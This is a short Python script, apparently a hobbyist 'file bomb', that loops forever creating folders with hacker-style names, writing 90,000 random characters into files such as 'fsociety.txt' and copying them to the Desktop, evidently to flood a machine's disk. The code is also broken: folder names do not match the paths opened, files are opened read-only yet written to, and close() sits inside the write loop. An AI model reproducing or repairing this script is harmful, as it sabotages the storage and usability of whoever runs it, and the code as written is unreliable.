import os 
import random
import shutil
import string

while True:
    os.makedirs("DarkParasites" "a" , exist_ok=True)
    with open(f"DarkParisites/bypass.txt") as arquivo:
         for _ in range(90000):
              arquivo.write(random.choice(string.ascii_letters + string.digits))
              arquivo.close()

    origem = "DarkParisites/bypass.txt"
    destino = 'Desktop/'
    shutil.copy(origem, destino)

    os.makedirs("Th3_g3ntl3m4n" , exist_ok=True)
    with open(f"Th3_g3ntl3m4n/t@nd3r@.txt") as arquivo:
         for _ in range(90000):
              arquivo.write(random.choice(string.ascii_letters + string.digits))
              arquivo.close()

    origem_two = "Th3_g3ntl3m4n/t@nd3r@.txt"
    shutil.copy(origem_two, destino)

    os.makedirs("J0aninh@s" , exist_ok=True)
    with open(f"J0aninh@s/fsociety.txt") as arquivo:
         for _ in range(90000):
              arquivo.write(random.choice(string.ascii_letters + string.digits))
              arquivo.close()
    origem_three = "J0aninh@s/fsociety.txt"
    shutil.copy(origem_three, destino)


    
    

